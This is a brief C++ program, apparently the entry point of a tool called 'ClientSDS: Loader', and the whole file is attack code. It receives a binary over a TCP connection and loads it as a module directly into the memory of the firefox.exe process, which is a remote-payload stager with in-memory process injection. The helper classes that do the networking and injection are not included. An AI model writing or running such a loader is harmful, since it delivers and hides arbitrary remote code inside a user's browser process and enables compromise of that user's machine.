#include "Client.h"
#include <Winuser.h>
#include "MemObject.h"
#include "Loader.h"
#pragma comment(lib, "USER32.lib")

int main(){
	Client * TCPclient = new Client();
	MemObject * pData = TCPclient->RecvBinary();

	Loader * pLoader = new Loader("firefox.exe");

	HMODULE hRet = NULL;

	//Load The Module Into A Process' Memory
	hRet = pLoader->LoadModuleFromMemory((ULONG)pData->buffer, pData->bSize);

	delete pLoader;
	delete pData;
	delete TCPclient;

	MessageBoxA(NULL, "Code Loaded!", "ClientSDS: Loader", MB_OK);

	return 0;
}